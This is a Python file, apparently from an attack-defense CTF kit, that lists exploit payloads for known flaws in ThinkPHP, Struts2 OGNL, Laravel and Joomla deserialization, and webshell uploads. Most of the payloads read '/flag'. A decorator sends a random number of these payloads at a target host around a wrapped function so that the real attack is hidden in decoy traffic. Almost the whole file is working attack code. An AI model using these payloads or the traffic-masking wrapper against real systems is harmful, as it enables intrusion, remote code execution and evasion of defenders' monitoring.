from functools import wraps
import random
import requests

obscure_traffics = [
    (
        'GET',
        '/index.php?a=fetch&templateFile=public/index&prefix=\'\'&content=<php>file_put_contents(\'test.php\',\'<?php phpinfo(); ?>\')</php>',
    ),
    (
        'GET',
        '/index.php?s=index/thinkRequest/input&filter[]=system&data=cat$20%2Fflag',
    ),
    (
        'GET',
        '/index.php?s=index/thinkContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20%2Fflag',
    ),
    (
        'GET',
        r'/index.php?a={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20%2Fflag',
    ),
    (
        'GET',
        "/?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
    ), (
        'GET',
        '/public/admin/controls/api.class.php?page=/flag',
    ),
    (
        'POST',
        '/',
        "('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'cat /flag\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))",
    ),
    (
        'POST',
        '/',
        'class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27cat /flag%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23k8team%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23k8team.println%28%23d%29%2c%23k8team.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]',
    ),
    (
        'POST',
        '/',
        "a=1${(%23_memberAccess[\"allowStaticMethodAccess\"]=true,%23a=@java.lang.Runtime@getRuntime().exec('cat /flag').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23k8team=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8team.println(%23d),%23k8team.close())}",
    ),
    (
        'POST',
        '/index.php?s=index/thinkContainer/classLoader',
        'O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D',
    ),
    (
        'POST',
        '/index.php?s=ajax/getInfo',
        '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat%20%2Fflag',
    ),
    ('POST', '/index.php?r=admin/extendfield/meslist&content=php://input',
     'system(\'cat /flag\');//'),
    (
        'POST',
        '/index.php?r=default/column/index&col=guestbook',
        'tname[]=joe<?php%20@eval($_POST[pass]);?>&tel=18988888888&qq=balabalba&content=asdasdasd&checkcode=6857&__hash__=7c337b66d36c2cff79faaa48201ba66b_89efI8f3lBwpIQ%2BPtjlL52Ml4DFXLp5Fd0RAYVbXqSik2bsNwm1XYCE',
    ),
    (
        'POST',
        '/index.php?r=Index/login',
        r'user=root&pam=1&expired=2&old=buyaoxiedaopocli|cat%20%2Fflag&new1=buyaoxiedaopocli&new2=buyaoxiedaopocli',
    ),
    (
        'POST',
        '/index.php?h=Public/Template/render',
        r'routestring=ajax/render/widget_php&widgetConfig[code]=system(\'cat%20%2Fflag\');exit;',
    ),
    ('POST',
     r'/index.php/?c=uploadify.class&m=include&a=doupfile&lang=cn&savepath=a.php%80/..\1.jpg',
     '<?php @eval($_POST[pass]); ?>'),
    (
        'POST',
        '/',
        's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}',
    ),
    (
        'POST',
        '/',
        r'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:25:"Illuminate\Bus\Dispatcher":1:{S:16:"\00*\00queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;S:4:"load";}}S:8:"\00*\00event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{S:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{S:9:"\00*\00config";O:35:"Mockery\Generator\MockConfiguration":1:{S:7:"\00*\00name";S:7:"abcdefg";}S:7:"\00*\00code";S:25:"<?php @eval($_POST[s]); exit; ?>";}}}',
    )
]


def ob(fn):
    @wraps(fn)
    def wrapper(*args, **kw):
        n = random.randint(0, 5)
        for _ in range(n):
            exp = random.choice(obscure_traffics)
            if exp[0] == 'GET':
                requests.get(f'http://{args[0]}{exp[1]}')
            else:
                requests.post(f'http://{args[0]}{exp[1]}', data=exp[2])
        fn(*args, **kw)
        n = random.randint(0, 5)
        for _ in range(n):
            exp = random.choice(obscure_traffics)
            if exp[0] == 'GET':
                requests.get(f'http://{args[0]}{exp[1]}')
            else:
                requests.post(f'http://{args[0]}{exp[1]}', data=exp[2])

    return wrapper
